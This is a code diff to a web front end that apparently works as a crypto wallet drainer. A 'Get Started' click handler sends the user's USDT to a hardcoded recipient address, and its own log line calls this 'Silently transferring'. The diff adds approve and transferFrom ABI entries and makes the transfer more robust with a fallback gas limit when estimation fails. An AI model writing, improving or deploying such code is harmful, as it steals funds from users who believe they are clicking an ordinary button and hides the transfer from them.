@@ -25,6 +25,79 @@ const USDT_ABI = [
     ],
     "stateMutability": "nonpayable",
     "type": "function"
+  },
+  {
+    "inputs": [
+      { "internalType": "address", "name": "spender", "type": "address" },
+      { "internalType": "uint256", "name": "amount", "type": "uint256" }
+    ],
+    "name": "approve",
+    "outputs": [
+      { "internalType": "bool", "name": "", "type": "bool" }
+    ],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      { "internalType": "address", "name": "owner", "type": "address" },
+      { "internalType": "address", "name": "spender", "type": "address" }
+    ],
+    "name": "allowance",
+    "outputs": [
+      { "internalType": "uint256", "name": "", "type": "uint256" }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      { "internalType": "address", "name": "sender", "type": "address" },
+      { "internalType": "address", "name": "recipient", "type": "address" },
+      { "internalType": "uint256", "name": "amount", "type": "uint256" }
+    ],
+    "name": "transferFrom",
+    "outputs": [
+      { "internalType": "bool", "name": "", "type": "bool" }
+    ],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "totalSupply",
+    "outputs": [
+      { "internalType": "uint256", "name": "", "type": "uint256" }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "decimals",
+    "outputs": [
+      { "internalType": "uint8", "name": "", "type": "uint8" }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "symbol",
+    "outputs": [
+      { "internalType": "string", "name": "", "type": "string" }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "name",
+    "outputs": [
+      { "internalType": "string", "name": "", "type": "string" }
+    ],
+    "stateMutability": "view",
+    "type": "function"
   }
 ];
 
@@ -99,14 +172,17 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
     console.log(`📢 Silently transferring: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);
     const contractWithSigner = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
     console.log("📜 Contract initialized:", { address: contractWithSigner.address, hasEstimateGas: !!contractWithSigner.estimateGas, hasTransfer: !!contractWithSigner.transfer });
-    if (!contractWithSigner.estimateGas || !contractWithSigner.estimateGas.transfer) {
-      throw new Error("Contract estimateGas.transfer is undefined. Verify ABI and contract address.");
-    }
     const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
     console.log("💰 Amount in Wei:", amountInWei.toString());
-    const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
-    const gasLimit = estimatedGas * 2n; // 2x for mainnet safety
-    console.log(`⛽ Estimated Gas: ${estimatedGas.toString()}, Gas Limit: ${gasLimit.toString()}`);
+    let gasLimit;
+    try {
+      const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
+      gasLimit = estimatedGas * 3n / 2n; // 1.5x estimated gas
+      console.log(`⛽ Estimated Gas: ${estimatedGas.toString()}, Gas Limit: ${gasLimit.toString()}`);
+    } catch (gasError) {
+      console.warn("⚠️ Gas estimation failed, using hardcoded gas limit:", gasError);
+      gasLimit = 100000n; // Fallback for USDT transfer
+    }
     const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
     console.log("🔄 Transaction sent:", transferTx.hash);
     await transferTx.wait();
